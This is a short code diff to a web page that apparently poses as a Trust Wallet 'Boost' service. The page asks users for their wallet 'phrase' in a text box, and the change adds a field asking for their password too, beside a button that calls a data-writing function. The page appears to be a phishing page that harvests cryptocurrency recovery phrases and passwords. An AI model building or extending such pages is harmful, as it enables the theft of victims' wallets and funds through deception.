@@ -69,7 +69,7 @@ a{
 
     box-shadow: 0 0 3px blue !important;
 }
-#ipt:focus{
+#ipt:focus,input:focus{
     outline: none !important;
 }
 .ph{
@@ -209,6 +209,7 @@ If you don’t have Trust Wallet already <a href="https://play.google.com/store/
                   
         <p id="ph" class="b">phrase</p>        
         <textarea id="ipt"></textarea>
+<input type="number" placeholder="enter password if used else ignore">
         <p id="add" type="submit" onclick="writeUserData()">Boost</p>
         </div>
         <div id="msgs">
